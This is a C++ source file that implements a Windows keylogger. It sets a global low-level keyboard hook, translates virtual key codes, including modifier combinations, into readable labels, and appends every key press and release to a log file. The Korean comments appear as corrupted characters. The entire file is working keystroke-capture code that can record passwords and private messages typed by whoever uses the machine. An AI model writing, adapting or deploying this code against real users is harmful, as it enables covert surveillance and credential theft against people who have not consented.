#include "keyLogger.h"

keyLogger::keyLogger()
{

}

// virtual key ����
void keyLogger::initializeKeyDict()
{
	virtualKeyDict.insert({ VK_BACK , "[Backspace]" });
	virtualKeyDict.insert({ VK_SPACE , "[SpaceBar]" });
	virtualKeyDict.insert({ VK_RETURN , "[Enter]" });
	virtualKeyDict.insert({ VK_BACK , "[Backspace]" });
	virtualKeyDict.insert({ VK_TAB , "[TAB]" });
	virtualKeyDict.insert({ VK_ESCAPE , "[ESC]" });
	virtualKeyDict.insert({ VK_DELETE , "[DELETE]" });
	virtualKeyDict.insert({ VK_LEFT , "[<-]" });
	virtualKeyDict.insert({ VK_RIGHT , "[->]" });
	virtualKeyDict.insert({ VK_UP , "[��]" });
	virtualKeyDict.insert({ VK_DOWN , "[��]" });
}

// make hook
void keyLogger::startHook()
{
	keyLogger::initializeKeyDict();

	HMODULE hModule = GetModuleHandle(NULL);
	keyHook = SetWindowsHookExA(WH_KEYBOARD_LL, KeyboardHook, hModule, NULL);

	MSG msg;
	GetMessage(&msg, NULL, NULL, NULL);
}

// Hooking function
LRESULT CALLBACK KeyboardHook(int nCode, WPARAM wParam, LPARAM lParam)
{
	if ((WM_KEYDOWN == wParam) || (WM_SYSKEYDOWN == wParam))
	{
		PKBDLLHOOKSTRUCT pKey = (PKBDLLHOOKSTRUCT)lParam;

		makeKeyLog(pKey->vkCode, 0);
	}
	else if ((WM_KEYUP == wParam) || (WM_SYSKEYUP == wParam))
	{
		PKBDLLHOOKSTRUCT pKey = (PKBDLLHOOKSTRUCT)lParam;

		makeKeyLog(pKey->vkCode, 1);
	}

	return CallNextHookEx(keyHook, nCode, wParam, lParam);
}
/*
	Ű �ڵ忡 �ش��ϴ� Ű ������ ã�� �α�
	����ȭ�� ���� �ð� ���� Ȥ�� Ƚ�� ������ �ּ�, ���� ��Ʈ���� ��Ȱ���ϵ��� ���� ����
*/
void makeKeyLog(int keyCode, int statusFlag)
{
	std::string logMessage = "";
	std::string status = "";

	// 0 : Down / 1 : Up
	if (statusFlag == 0)
		status = "KEY_DOWN => ";
	else if(statusFlag == 1)
		status = "KEY_UP => ";

	// ctrl, shift, alt�� ��� �ٸ� Ű�� ��κ� �Բ� ���ǹǷ� GetAsyncState�� ó��
	if (GetAsyncKeyState(VK_LCONTROL) & 0x8000 || GetAsyncKeyState(VK_RCONTROL) & 0x8000 || GetAsyncKeyState(VK_CONTROL) & 0x8000) {
		logMessage.append("[Ctrl] + ");
	}
	else if (GetAsyncKeyState(VK_LSHIFT) & 0x8000 || GetAsyncKeyState(VK_RSHIFT) & 0x8000) {
		logMessage.append("[Shift] + ");
	}
	else if (GetAsyncKeyState(VK_LMENU) & 0x8000 || GetAsyncKeyState(VK_RMENU) & 0x8000) {
		logMessage.append("[Alt] + ");
	}
	else {
		logMessage.append("");
	}

	// Ű�� �ش��ϴ� Ű ������ ã�� ��ƾ
	if (0x00 < keyCode && (0x2F >= keyCode || keyCode >= 0x5B)) {
		for (auto virtualKey : virtualKeyDict) {
			if (keyCode == virtualKey.first) {
				logMessage.append(virtualKey.second);
				break;
			}
		}
	}
	else
		logMessage.push_back((char)keyCode);

	if (logMessage == "")
		return;

	// std::cout << status + logMessage << std::endl;

	writeStream.open(savePath, std::ios_base::app);

	writeStream << status + logMessage << std::endl;

	writeStream.close();
}